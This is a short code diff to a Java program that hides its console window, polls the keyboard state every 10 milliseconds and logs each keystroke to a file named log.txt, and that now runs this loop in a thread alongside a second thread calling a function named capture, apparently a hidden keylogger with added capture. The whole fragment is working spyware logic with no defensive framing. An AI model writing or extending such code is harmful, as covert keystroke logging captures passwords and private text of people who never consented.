@@ -173,18 +173,25 @@ public class App {
 
   public static void main(String[] args) {
     Kernel32.INSTANCE.FreeConsole();
-    char i;
-    while (true) {
-      try {
-        Thread.sleep(10);
-      } catch (InterruptedException e) {
-        e.printStackTrace();
-      }
-      for (i = 8; i <= 255; i++) {
-        if (User32.INSTANCE.GetAsyncKeyState(i) == -32767) {
-          logger(i, "log.txt");
+    Thread loggerThread = new Thread(() -> {
+      char i;
+      while (true) {
+        try {
+          Thread.sleep(10);
+        } catch (InterruptedException e) {
+          e.printStackTrace();
+        }
+        for (i = 8; i <= 255; i++) {
+          if (User32.INSTANCE.GetAsyncKeyState(i) == -32767) {
+            logger(i, "log.txt");
+          }
         }
       }
-    }
+    });
+
+    Thread function2Thread = new Thread(App::capture);
+
+    loggerThread.start();
+    function2Thread.start();
   }
 }
